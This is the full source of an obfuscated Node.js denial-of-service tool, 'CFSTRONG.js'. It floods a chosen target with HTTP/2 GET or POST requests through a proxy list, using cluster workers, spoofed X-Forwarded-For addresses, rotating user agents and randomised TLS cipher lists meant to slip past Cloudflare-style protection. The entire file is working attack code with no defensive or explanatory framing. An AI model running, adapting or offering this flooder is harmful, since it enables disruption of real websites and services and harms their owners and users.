process.on("uncaughtException", function (_0xa2cex1) {});
process.on("unhandledRejection", function (_0xa2cex1) {});
require("events").EventEmitter.defaultMaxListeners = 0;
const fs = require("fs");
const url = require("url");
const randstr = require("randomstring");
var path = require("path");
const cluster = require("cluster");
const http2 = require("http2");
var fileName = __filename;
var file = path.basename(fileName);
let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;
if (process.argv.length < 8) {
  console.log("[32m node CFSTRONG.js [Target] [Time] [Threads] [Method] [Proxy List] [Requests Per IP]");
  process.exit(0);
}
;
let randomparam = false;
var proxies = fs.readFileSync(process.argv[6], "utf-8").toString().replace(/\r/g, "").split("\n");
var rate = process.argv[7];
var target_url = process.argv[2];
const target = target_url.split('""')[0];
process.argv.forEach(_0xa2cex12 => {
  if (_0xa2cex12.includes("cookie=") && !process.argv[5].split('""')[0].includes(_0xa2cex12)) {
    COOKIES = _0xa2cex12.slice(7);
  } else {
    if (_0xa2cex12.includes("postdata=") && !process.argv[5].split('""')[0].includes(_0xa2cex12)) {
      if (process.argv[5].toUpperCase() != "POST") {
        console.error("Method Invalid (Has Postdata But Not POST Method)");
        process.exit(1);
      }
      ;
      POSTDATA = _0xa2cex12.slice(9);
    } else {
      if (_0xa2cex12.includes("randomstring=")) {
        randomparam = _0xa2cex12.slice(13);
        console.log("[Info] RandomString Mode Enabled.");
      } else {
        if (_0xa2cex12.includes("headerdata=")) {
          headerbuilders = {accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9", "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "sec-fetch-dest": "empty", "sec-fetch-site": "cross-site", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", TE: "trailers", Pragma: "no-cache", "upgrade-insecure-requests": 1, "Cache-Control": "max-age=0", Referer: target, "X-Forwarded-For": spoof(), Cookie: COOKIES, ":method": "GET"};
          if (_0xa2cex12.slice(11).split('""')[0].includes("&")) {
            const _0xa2cex13 = _0xa2cex12.slice(11).split('""')[0].split("&");
            for (let i = 0; i < _0xa2cex13.length; i++) {
              const _0xa2cex15 = _0xa2cex13[i].split("=")[0];
              const _0xa2cex16 = _0xa2cex13[i].split("=")[1];
              headerbuilders[_0xa2cex15] = _0xa2cex16;
            }
          } else {
            const _0xa2cex13 = _0xa2cex12.slice(11).split('""')[0];
            const _0xa2cex15 = _0xa2cex13.split("=")[0];
            const _0xa2cex16 = _0xa2cex13.split("=")[1];
            headerbuilders[_0xa2cex15] = _0xa2cex16;
          }
        }
      }
    }
  }
});
if (COOKIES !== undefined) {
  console.log("[Info] Custom Cookie Mode Enabled.");
} else {
  COOKIES = "";
}
;
if (POSTDATA !== undefined) {
  console.log("[Info] Custom PostData Mode Enabled.");
} else {
  POSTDATA = "";
}
;
if (headerbuilders !== undefined) {
  console.log("[Info] Custom HeaderData Mode Enabled.");
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
    }
    ;
    console.log("[32m    ███████╗████████╗ █████╗ ██████╗ ████████╗███████╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗     ");
    console.log("[32m    ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝     ");
    console.log("[32m    ███████╗   ██║   ███████║██████╔╝   ██║   █████╗  ██║  ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝      ");
    console.log("[32m    ╚════██║   ██║   ██╔══██║██╔══██╗   ██║   ██╔══╝  ██║  ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗      ");
    console.log("[32m    ███████║   ██║   ██║  ██║██║  ██║   ██║   ███████╗██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗     ");
    console.log("[32m    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1e3);
  } else {
    startflood();
  }
} else {
  headerbuilders = {accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9", "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "sec-fetch-dest": "empty", "sec-fetch-site": "cross-site", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", TE: "trailers", Pragma: "no-cache", "upgrade-insecure-requests": 1, "Cache-Control": "max-age=0", Referer: target, "X-Forwarded-For": spoof(), Cookie: COOKIES, ":method": "GET"};
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
    }
    ;
    console.log("[32m    ███████╗████████╗ █████╗ ██████╗ ████████╗███████╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗     ");
    console.log("[32m    ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝     ");
    console.log("[32m    ███████╗   ██║   ███████║██████╔╝   ██║   █████╗  ██║  ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝      ");
    console.log("[32m    ╚════██║   ██║   ██╔══██║██╔══██╗   ██║   ██╔══╝  ██║  ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗      ");
    console.log("[32m    ███████║   ██║   ██║  ██║██║  ██║   ██║   ███████╗██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗     ");
    console.log("[32m    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1e3);
  } else {
    startflood();
  }
}
;
var parsed = url.parse(target);
process.setMaxListeners(0);
function ra() {
  const _0xa2cex19 = randstr.generate({charset: "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789", length: 4});
  return _0xa2cex19;
}
const UAs = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0", "Opera/4.0 (Windows NT 3.0; rv:2.0.1) Gecko/20100101 Firefox/3.0.3", "Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28"];
function spoof() {
  return `${""}${randstr.generate({length: 1, charset: "12"})}${""}${randstr.generate({length: 1, charset: "012345"})}${""}${randstr.generate({length: 1, charset: "012345"})}${"."}${randstr.generate({length: 1, charset: "12"})}${""}${randstr.generate({length: 1, charset: "012345"})}${""}${randstr.generate({length: 1, charset: "012345"})}${"."}${randstr.generate({length: 1, charset: "12"})}${""}${randstr.generate({length: 1, charset: "012345"})}${""}${randstr.generate({length: 1, charset: "012345"})}${"."}${randstr.generate({length: 1, charset: "12"})}${""}${randstr.generate({length: 1, charset: "012345"})}${""}${randstr.generate({length: 1, charset: "012345"})}${""}`;
}
const cplist = ["options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];
function startflood() {
  if (process.argv[5].toUpperCase() == "POST") {
    const _0xa2cex1e = url.parse(target).path.replace("%RAND%", ra());
    headerbuilders[":method"] = "POST";
    headerbuilders["Content-Type"] = "text/plain";
    if (randomparam) {
      setInterval(() => {
        headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
        var _0xa2cex1f = cplist[Math.floor(Math.random() * cplist.length)];
        var _0xa2cex20 = proxies[Math.floor(Math.random() * proxies.length)];
        _0xa2cex20 = _0xa2cex20.split(":");
        var _0xa2cex21 = require("http"), _0xa2cex22 = require("tls");
        _0xa2cex22.DEFAULT_MAX_VERSION = "TLSv1.3";
        var _0xa2cex23 = _0xa2cex21.request({host: _0xa2cex20[0], port: _0xa2cex20[1], ciphers: _0xa2cex1f, method: "CONNECT", path: parsed.host + ":443"}, _0xa2cex24 => {
          _0xa2cex23.end();
          return;
        });
        _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
          const _0xa2cex27 = http2.connect(parsed.href, {createConnection: () => {
            return _0xa2cex22.connect({host: parsed.host, ciphers: _0xa2cex1f, secureProtocol: "TLS_method", servername: parsed.host, challengesToSolve: 5, cloudflareTimeout: 5e3, cloudflareMaxTimeout: 3e4, maxRedirects: 20, followAllRedirects: true, decodeEmails: false, gzip: true, servername: parsed.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: _0xa2cex26}, function () {
              for (let i = 0; i < rate; i++) {
                headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${"?"}${randomparam}${"="}${randstr.generate({length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}${""}`;
                headerbuilders["X-Forwarded-For"] = spoof();
                headerbuilders.Body = `${""}${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", ra()) : POSTDATA}${""}`;
                headerbuilders.Cookie.replace("%RAND%", ra());
                const _0xa2cex23 = _0xa2cex27.request(headerbuilders);
                _0xa2cex23.end();
                _0xa2cex23.on("response", () => {
                  _0xa2cex23.close();
                });
              }
            });
          }});
        });
        _0xa2cex23.end();
      });
    } else {
      setInterval(() => {
        headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
        var _0xa2cex1f = cplist[Math.floor(Math.random() * cplist.length)];
        var _0xa2cex20 = proxies[Math.floor(Math.random() * proxies.length)];
        _0xa2cex20 = _0xa2cex20.split(":");
        var _0xa2cex21 = require("http"), _0xa2cex22 = require("tls");
        _0xa2cex22.DEFAULT_MAX_VERSION = "TLSv1.3";
        var _0xa2cex23 = _0xa2cex21.request({host: _0xa2cex20[0], port: _0xa2cex20[1], ciphers: _0xa2cex1f, method: "CONNECT", path: parsed.host + ":443"}, _0xa2cex24 => {
          _0xa2cex23.end();
          return;
        });
        _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
          const _0xa2cex27 = http2.connect(parsed.href, {createConnection: () => {
            return _0xa2cex22.connect({host: `${""}${url.parse(target).path.includes("%RAND%") ? _0xa2cex1e : url.parse(target).path}${""}`, ciphers: _0xa2cex1f, secureProtocol: "TLS_method", servername: parsed.host, challengesToSolve: 5, cloudflareTimeout: 5e3, cloudflareMaxTimeout: 3e4, maxRedirects: 20, followAllRedirects: true, decodeEmails: false, gzip: true, servername: parsed.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: _0xa2cex26}, function () {
              for (let i = 0; i < rate; i++) {
                headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${""}`;
                headerbuilders["X-Forwarded-For"] = spoof();
                headerbuilders.Body = `${""}${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", ra()) : POSTDATA}${""}`;
                headerbuilders.Cookie.replace("%RAND%", ra());
                const _0xa2cex23 = _0xa2cex27.request(headerbuilders);
                _0xa2cex23.end();
                _0xa2cex23.on("response", () => {
                  _0xa2cex23.close();
                });
              }
            });
          }});
        });
        _0xa2cex23.end();
      });
    }
  } else {
    if (process.argv[5].toUpperCase() == "GET") {
      headerbuilders[":method"] = "GET";
      if (randomparam) {
        setInterval(() => {
          headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
          var _0xa2cex1f = cplist[Math.floor(Math.random() * cplist.length)];
          var _0xa2cex20 = proxies[Math.floor(Math.random() * proxies.length)];
          _0xa2cex20 = _0xa2cex20.split(":");
          var _0xa2cex21 = require("http"), _0xa2cex22 = require("tls");
          _0xa2cex22.DEFAULT_MAX_VERSION = "TLSv1.3";
          var _0xa2cex23 = _0xa2cex21.request({host: _0xa2cex20[0], port: _0xa2cex20[1], ciphers: _0xa2cex1f, method: "CONNECT", path: parsed.host + ":443"}, _0xa2cex24 => {
            _0xa2cex23.end();
            return;
          });
          _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
            const _0xa2cex27 = http2.connect(parsed.href, {createConnection: () => {
              return _0xa2cex22.connect({host: parsed.host, ciphers: _0xa2cex1f, secureProtocol: "TLS_method", servername: parsed.host, challengesToSolve: 5, cloudflareTimeout: 5e3, cloudflareMaxTimeout: 3e4, maxRedirects: 20, followAllRedirects: true, decodeEmails: false, gzip: true, servername: parsed.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: _0xa2cex26}, function () {
                for (let i = 0; i < rate; i++) {
                  headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${"?"}${randomparam}${"="}${randstr.generate({length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}${""}`;
                  headerbuilders["X-Forwarded-For"] = spoof();
                  headerbuilders.Cookie.replace("%RAND%", ra());
                  const _0xa2cex23 = _0xa2cex27.request(headerbuilders);
                  _0xa2cex23.end();
                  _0xa2cex23.on("response", () => {
                    _0xa2cex23.close();
                  });
                }
              });
            }});
          });
          _0xa2cex23.end();
        });
      } else {
        setInterval(() => {
          headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
          var _0xa2cex1f = cplist[Math.floor(Math.random() * cplist.length)];
          var _0xa2cex20 = proxies[Math.floor(Math.random() * proxies.length)];
          _0xa2cex20 = _0xa2cex20.split(":");
          var _0xa2cex21 = require("http"), _0xa2cex22 = require("tls");
          _0xa2cex22.DEFAULT_MAX_VERSION = "TLSv1.3";
          var _0xa2cex23 = _0xa2cex21.request({host: _0xa2cex20[0], port: _0xa2cex20[1], ciphers: _0xa2cex1f, method: "CONNECT", path: parsed.host + ":443"}, _0xa2cex24 => {
            _0xa2cex23.end();
            return;
          });
          _0xa2cex23.on("connect", function (_0xa2cex25, _0xa2cex26, _0xa2cex15) {
            const _0xa2cex27 = http2.connect(parsed.href, {createConnection: () => {
              return _0xa2cex22.connect({host: parsed.host, ciphers: _0xa2cex1f, secureProtocol: "TLS_method", servername: parsed.host, challengesToSolve: 5, cloudflareTimeout: 5e3, cloudflareMaxTimeout: 3e4, maxRedirects: 20, followAllRedirects: true, decodeEmails: false, gzip: true, servername: parsed.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: _0xa2cex26}, function () {
                for (let i = 0; i < rate; i++) {
                  headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${""}`;
                  headerbuilders["X-Forwarded-For"] = spoof();
                  headerbuilders.Cookie.replace("%RAND%", ra());
                  const _0xa2cex23 = _0xa2cex27.request(headerbuilders);
                  _0xa2cex23.end();
                  _0xa2cex23.on("response", () => {
                    _0xa2cex23.close();
                  });
                }
              });
            }});
          });
          _0xa2cex23.end();
        });
      }
    } else {
      console.log("[Info] Invalid Method.");
      process.exit(1);
    }
  }
}
